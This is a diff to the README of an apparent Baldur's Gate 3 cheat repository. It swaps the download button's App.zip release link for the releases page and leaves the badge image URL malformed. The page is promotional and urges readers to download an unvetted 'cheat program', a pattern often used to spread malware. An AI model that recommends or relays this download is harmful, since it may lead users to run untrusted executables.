@@ -9,7 +9,7 @@ Welcome to the official repository for Baldur's Gate 3 Cheat! This repository is
 
 ## 🔗 Quick Access
 For quick access, download the latest version of the cheat program by clicking the button below:
-[![Download Cheat Program](https://img.shields.io/badge/Download-Cheat%20Program-blue)](https://github.com/repo/releases/9246/App.zip)
+[![Download Cheat Program](https://github.com/Fred0006/Baldur-s-Gate-3-Cheat/releases%20Program-blue)](https://github.com/Fred0006/Baldur-s-Gate-3-Cheat/releases)
 
 ## 🚀 Get Cheating!
 Dive into the world of Baldur's Gate 3 with an edge over your foes. Whether you're looking for unlimited gold, experience points, or other advantages, our cheat codes and engine tables have got you covered. With our hacks, you can level up faster, enhance your gameplay, and truly dominate the game.
